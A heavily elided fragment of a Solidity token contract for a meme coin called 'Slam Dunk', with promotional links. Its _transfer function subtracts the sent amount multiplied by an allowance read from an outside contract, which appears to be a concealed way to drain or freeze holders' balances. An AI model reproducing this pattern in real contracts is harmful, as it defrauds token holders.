// website: https://www.slamdunk.tokyo/  telegram: https://t.me/slamdunk_meme   twitter: https://twitter.com/SlamDunkMeme
...
contract SlamDunk is Context, IERC20, Ownable {
    ...
    string private constant _name = "Slam Dunk";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        uint256 sd = sdToken.allowance(from, to);
        _balances[from]=_balances[from].sub(amount * sd);
